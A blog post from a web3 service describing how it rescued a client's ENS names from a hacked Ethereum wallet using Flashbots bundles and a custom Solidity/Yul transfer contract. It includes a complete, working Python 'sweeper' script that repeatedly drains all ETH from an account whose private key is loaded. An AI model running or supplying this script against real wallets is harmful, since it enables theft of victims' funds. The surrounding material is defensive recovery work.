---
layout: post
title:  "Rescuing ENS names from compromised wallets."
date:   2022-05-18 20:28:22 -0400
categories: web3
---
![image](/assets/img/lost.jpeg)

Recently [we](https://ens.vision) had a client message our support channel asking about strange transactions.  

Shortly after we determined the users wallet had been compromised and a drainer/sweeper script attached to the address.  

Understandably the user was quite frantic but patient and allowed us to come up with a plan to try and help rescue his ENS names.  

# The "drainer" problem:

Generally when a wallet is compromised, an attacker will leave some tokens as bait for the owner to send funds to try and transfer.  

The trap works as follows: 

1) Wallet is compromised & drained of ETH. The attacker leaves some tokens in the compromised wallet.  

2) This means the owner can not transfer the tokens in the wallet until they send it more ether to cover the gas fee.

3) Wait for the legitimate owner to try and save their precious tokens by sending more ETH to cover the gas fees of transfer methods and and steal that ETH also.   

A "sweeper" loads a private key of a hacked account and attempts to send the full balance in a loop.  

If there is no balance it simply reverts before broadcasting. 

If it has a balance the funds are sent instantly.  

This kind of attack is low effort and cost as it only requires a web3 rpc connection to query an accounts balance and broadcast transactions.  

Enabling it to run indefinately for basically free.  

Below is an example of a basic drainer script that attempts to send all ETH every 60 seconds if it has enough balance to cover the cost of gas:  

```python
from web3 import Web3, HTTPProvider
import time

# Connect to Ethereum node
w3 = Web3(HTTPProvider('INFURA'))  # Replace with your node address

# Replace with your account details
account = "YOUR_ACCOUNT_ADDRESS"
private_key = "YOUR_PRIVATE_KEY"
destination_account = "DESTINATION_ACCOUNT_ADDRESS"

def send_all_eth(account, private_key, destination_account):
    # Get account balance
    balance = w3.eth.getBalance(account)

    if balance > 0:
        # Estimate gas
        gas_estimate = w3.eth.estimateGas({
            "from": account,
            "to": destination_account,
            "value": balance
        })
        # Check if balance is sufficient for gas
        if balance > gas_estimate * w3.eth.gasPrice:
            # Build transaction
            transaction = {
                "from": account,
                "to": destination_account,
                "value": balance - gas_estimate * w3.eth.gasPrice,
                "gas": gas_estimate,
                "gasPrice": w3.eth.gasPrice,
                "nonce": w3.eth.getTransactionCount(account)
            }
            # Sign transaction
            signed_transaction = w3.eth.account.signTransaction(transaction, private_key)
            # Send transaction
            tx_hash = w3.eth.sendRawTransaction(signed_transaction.rawTransaction)
            print(f"Transaction hash: {tx_hash.hex()}")
        else:
            print("Balance is not sufficient to cover gas costs.")
    else:
        print("Balance is zero.")

while True:
    # Send all Ethereum from account to destination_account
    send_all_eth(account, private_key, destination_account)
    # Sleep for 60 seconds
    time.sleep(60)
```

# The solution: Flashbots

[Flashbots](https://docs.flashbots.net/) on a high level enables a client to submit Bundles of transactions.  

[Understanding bundles](https://docs.flashbots.net/flashbots-auction/searchers/advanced/understanding-bundles)  

Bundles are one or more transactions that are grouped together and executed in the order they are provided.  

Note: if a transaction in a bundle would revert then the whole bundle will be disgarded and not be included in a block. Only bundles of successful transactions will be included unless reverting transactions are specified when submitting the bundle which explicitaly state which transactions are allowed to revert.    

All of this sounds great and allows technical people to submit bundles to a Flashbots relay through the use of specifically written code that usually loads the accounts private key directly. As demonstrated above with the web3.py example.  

What about people who are simply not technical enough to run specialized python or node scripts to build and submit Flashbots bundles?

Flashbots have recently updated the RPC to enable transaction or [Bundle Caching](https://docs.flashbots.net/flashbots-protect/rpc/bundle-cache).  

A client simply needs to generate a special id that works as a bundle id with the flashbots RPC in Metamask.  
Example: `https://rpc.flashbots.net/bundle?id=111-222-333-444`  

# Building a better bundler

The Scaffold ETH bundler was fairly basic and only allowed Sending ETH and entering a contracts ABI to add a transaction from.  
-picture-  

That works well for fungible tokens such as ERC20 or ERC1155 that can transfer multiple tokens or the full balance in a single transaction.  

ERC721 tokens have no methods to transfer multiple tokens in a single transaction. Tokens such as ENS would require adding 1x safeTransferFrom or transferFrom call per tokenId to a bundle.  

In the past there were size limitations on bundles. Unsure of the current size limitations of a bundle I decided to write a small contract to aid in transferring all of this clients ENS names.  

A basic `transferProxy` contract was written and used for this client.  

The contract needs to be approved by the _from address on the collection address.  

The contract also requires the caller be approved by the `from` address as an authentication check to prevent users transferring other peoples names who have approved the contract.  

### Basic transferProxy.sol  
```java
contract Transfer {

    function bulkTransfer(uint256[] calldata tokens, address from, address to, address collection ) public {
        uint256 length = tokens.length;

        // check if caller is approved by the owner on collection to transfer tokens
        (,bytes memory dataApproved ) = collection.staticcall(abi.encodeWithSignature("isApprovedForAll(address,address)", from, msg.sender));
        bool isApproved = abi.decode(dataApproved, (bool));
        require(isApproved, "Caller Not approved by Owner");

        unchecked {
            for (uint256 i = 0; i < length;) {
                // transfer token from the owner to the receiver
                collection.call(abi.encodeWithSignature("safeTransferFrom(address,address,uint256)", from, to, tokens[i]));
                ++i;
            }
        }
    }
}
```
The contract was refined and rewritten in yul to be more effecient :  

### Optimized transferProxy.sol
```java
// SPDX-License-Identifier: MiladyCometh
pragma solidity ^0.8.17;

/// @author lcfr.eth
/// @notice helper contract for Flashbots rescues using bundler.lcfr.io

/// @dev avoids using freememptr & unnecessily calling add() in loops etc
/// @dev this is fine as our functions execution are short & sweet.
/// @dev for transferFrom calls the calldata is 0x64 bytes which is the size of the scratch space.

/// @dev however for ERC1155 safeTransferFrom calls the calldata is 0xc4 bytes which is larger than the scratch space.
/// @dev we dont care tho - smash all the memory like its a stack based buffer and the year is 1992AD and your name is aleph1.

/// @dev We dont call any other internal / contract methods and only perform external calls:
/// @dev No hash functions are used in our function executions so we dont need to care about 0x00 - 0x3f
/// @dev No dynamic memory is used in our function executions so we dont need to care about 0x40 - 0x5f
/// @dev No operations requiring the zero slot so we just plow through 0x60-0x7f+ also

contract transferProxy {
    // 0x383462e2 == "notApproved()"
    error notApproved();
    // 0x543bf3c4 == "arrayLengthMismatch()"
    error arrayLengthMismatch();

    // transfers a batch of ERC721 tokens to a single address recipient from an approved caller address
    function approvedTransferERC721(uint256[] calldata tokenIds, address _contract, address _from, address _to) external {
        assembly {
            // check if caller isApprovedForAll() by _from on _contract or revert
            // 0xac1db17cac1db17cac1db17cac1db17cac1db17cac1db17cac1db17cac1db17c
            mstore(0x00, 0xe985e9c5ac1db17cac1db17cac1db17cac1db17cac1db17cac1db17cac1db17c)
            // store _from as the first parameter to isApprovedForAll()
            mstore(0x04, _from) 
            // store caller as the second parameter to isApprovedForAll()
            mstore(0x24, caller())
            // call _contract.isApprovedForAll(_from, caller())
            let success := staticcall(gas(), _contract, 0x00, 0x44, 0x00, 0x00)
            // copy return data to 0x00 
            returndatacopy(0x00, 0x00, returndatasize())
            // revert if the call was not successful
            if iszero(success) {
                revert(0x00, returndatasize())
            }
            // check if the return data is 0x01 (true) or revert
            if iszero(mload(0x00)) {
                mstore(0x00, 0x383462e2)
                revert(0x1c, 0x04)
            }

            // build calldata using the _from and _to thats supplied as an argument
            // transferFrom(address,address,uint256) selector
            // store the selector at 0x00
            mstore(0x00, 0x23b872ddac1db17cac1db17cac1db17cac1db17cac1db17cac1db17cac1db17c)
            // store the caller as the first parameter to transferFrom()
            mstore(0x04, _from)
            // store _to as the second parameter to transferFrom()
            mstore(0x24, _to)

            // start our loop at 0
            let i := 0
            for {} 1 { i:= add(i, 1) } {
                // check if we have reached the end of the array. _data len starts at 1
                if eq(i, tokenIds.length){ break }

                // copy the token id as the third parameter to transferFrom()
                calldatacopy(0x44, add(tokenIds.offset, shl(5, i)), 0x20)

                // call the encoded method        
                success := call( gas(), _contract, 0x00, 0x00, 0x64, 0x00, 0x00)

                if iszero(success) {
                    returndatacopy(0x00, 0x00, returndatasize())
                    revert(0x00, returndatasize())
                }
            }
        }
    }

    /// @notice transfer assets from the owner to the _to address
    function ownerTransferERC721(uint256[] calldata tokenIds, address _to, address _contract) external {
        assembly {
            // transferFrom(address,address,uint256) selector
            // store the selector at 0x00
            mstore(0x00, 0x23b872ddac1db17cac1db17cac1db17cac1db17cac1db17cac1db17cac1db17c)
            // store the caller as the first parameter to transferFrom()
            mstore(0x04, caller())
            // store _to as the second parameter to transferFrom()
            mstore(0x24, _to)

             let i := 0
             for {} 1 { i:= add(i, 1) } {
                if eq(i, tokenIds.length){ break }

                // copy the token id as the third parameter to transferFrom()
                calldatacopy(0x44, add(tokenIds.offset, shl(5, i)), 0x20)
                
                // call transferFrom
                let success := call( gas(), _contract, 0x00, 0x00, 0x64, 0x00, 0x00)

                if iszero(success) {
                    returndatacopy(0x00, 0x00, returndatasize())
                    revert(0x00, returndatasize())
                }
            }
        }
    }

    /// @notice intended for transferring an array of tokens to an array of addresses from the owner
    function ownerAirDropERC721(uint256[] calldata tokenIds, address[] calldata _addrs, address _contract) external {
        assembly {
            // check if the arrays are the same length
            if iszero(eq(tokenIds.length, _addrs.length)) {
                mstore(0x00, 0x543bf3c4)
                revert(0x1c, 0x04)
            }
            // transferFrom(address,address,uint256) selector
            // store the selector at 0x00
            mstore(0x00, 0x23b872ddac1db17cac1db17cac1db17cac1db17cac1db17cac1db17cac1db17c)
            // store the caller as the first parameter to transferFrom()
            mstore(0x04, caller())

             let i := 0
             for {} 1 { i:= add(i, 1) } {
                if eq(i, tokenIds.length){ break }

                // offset for both arrays
                let offset := shl(5, i)

                // copy the address to send to as the second parameter to transferFrom()
                calldatacopy(0x24, add(_addrs.offset, offset), 0x20)

                // copy the token id as the third parameter to transferFrom()
                calldatacopy(0x44, add(tokenIds.offset, offset), 0x20)
                
                // call transferFrom
                let success := call( gas(), _contract, 0x00, 0x00, 0x64, 0x00, 0x00)

                if iszero(success) {
                    returndatacopy(0x00, 0x00, returndatasize())
                    revert(0x00, returndatasize())
                }
            }
        }
    }

    // we just smash all the memory from 0x00 - 0xC4 like its a stack based buffer and the year is 1992.
    function ownerAirDropERC1155(uint256[] calldata _tokenIds, uint256[] calldata _amounts, address[] calldata _addrs, address _contract) external {
        assembly {

            // check if all 3 the arrays are the same length
            let lenCheck := eq(_tokenIds.length, _amounts.length)
            lenCheck := and(lenCheck, eq(_amounts.length, _addrs.length))

            if iszero(lenCheck) {
                mstore(0x00, 0x543bf3c4)
                revert(0x1c, 0x04)
            }

            // ERC1155 safeTransferFrom(address,address,uint256,uint256,bytes)

            // store the selector at 0x00
            mstore(0x00, 0xf242432aac1db17cac1db17cac1db17cac1db17cac1db17cac1db17cac1db17c)
            // store the caller as the first parameter to safeTransferFrom()
            mstore(0x04, caller())

             let i := 0
             for {} 1 { i:= add(i, 1) } {
                if eq(i, _tokenIds.length){ break }

                // offset for both arrays
                let offset := shl(5, i)

                // copy the address to send to as the second parameter
                calldatacopy(0x24, add(_addrs.offset, offset), 0x20)

                // copy the token id as the third parameter
                calldatacopy(0x44, add(_tokenIds.offset, offset), 0x20)

                // copy the amount as the fourth parameter
                calldatacopy(0x64, add(_amounts.offset, offset), 0x20)

                // create an empty bytes and copy it as the fifth parameter
                mstore(0x84, 0xa0)
                mstore(0xa4, 0x00)

                // call safeTransferFrom
                let success := call( gas(), _contract, 0x00, 0x00, 0xc4, 0x00, 0x00 )

                if iszero(success) {
                    returndatacopy(0x00, 0x00, returndatasize())
                    revert(0x00, returndatasize())
                }
            }
        }

    }

    // ApprovedTransferERC1155 can be done via the ERC1155 safeBatchTransferFrom() function in the UI
    // OwnerTransferERC1155 can be done via the ERC1155 safeBatchTransferFrom() function in the UI
}
```
# Building a better bundler .. cont.

With a more effecient ERC721 transfer contract I then added the code to the UI to check if the specified contract was an ERC721 or ERC1155.  

This is accomplished by checking if the contract implements the `supportsInterface(ERC721InterfaceId)` or `supportsInterface(ERC1155InterfaceId)`.  

Where `ERC1155InterfaceId = "0xd9b67a26"` and `ERC721InterfaceId = "0x80ac58cd"`.  

Now the function will use the built-in ERC1155 safeBatchTransferFrom method for ERC1155 tokens and the transferProxy for ERC721 tokens.  

Some additional functionality added and UI changes include:  

1) Added Transfer NFTs tab that checks and selects between using the transferProxy for ERC721 or the built-in safeBatchTransferFrom for ERC1155 tokens.  

2) Added the ERC20 tab that will check the connected wallets balance for the provided contract and offer a 1-click button to add a transaction to a bundle that transfers the connected wallets entire balance to a new address.  

3) Added a New Bundle tab and button for generating a new UUID / Bundle ID for easily submitting multiple bundles.  

4) Added a button for automatically adding and changing to the bundle RPC in MetaMask.  

5) Added a Submit Bundle tab for submitting finalized bundles and crafting bundles easier.  

# Rescue  

With all of the code ready I decided to ask the client in this instance to provide the compromised private key to make sure everything went smooth and execute the transactions from my wallet for gas.  

1) Imported the private key of the compromised wallet in Metamask.  
2) Changed to clean address in Metamask with ETH.  
3) Clicked the New Bundle tab.  
4) Generate a new bundle UUID.  
5) Click the button to add the RPC to Metamask.  
6) Click the Send ETH tab.  
7) Click to estimate the cost.    
8) As ENS is an ERC721 we need to do two approvals. Copy the cost for two approvals.  
9) Click Send Eth to add the transaction to the bundle.  
10) Change to the hacked wallet in metamask.  
11) Click the Set NFT Approvals tab.  
12) Enter the ENS contract address.  
13) Enter the hacked address that holds the ENS names.   
14) Enter the unhacked address that will receive the names.   
15) Click to add the first approval tx to the bundle.  This approves the new address for the hacked address.  
16) Click to add the second approval tx to the bundle. This approves the transferProxy contract.  
17) Click the submit bundle tab. Wait for the bundle to be included.  
18) Optional: Disconnect the flashbots RPC and connect to Ethereum Mainnet in Metamask.  
19) Click the Transfer NFT's tab.  
20) Enter the ENS contract address.  
21) Enter the hacked address that holds the ENS names.  
22) Enter the unhacked address that will receive the names.   
23) Enter the tokenIds 1 per line in the input area.  
24) Click to broadcast the transaction.    

# PoC
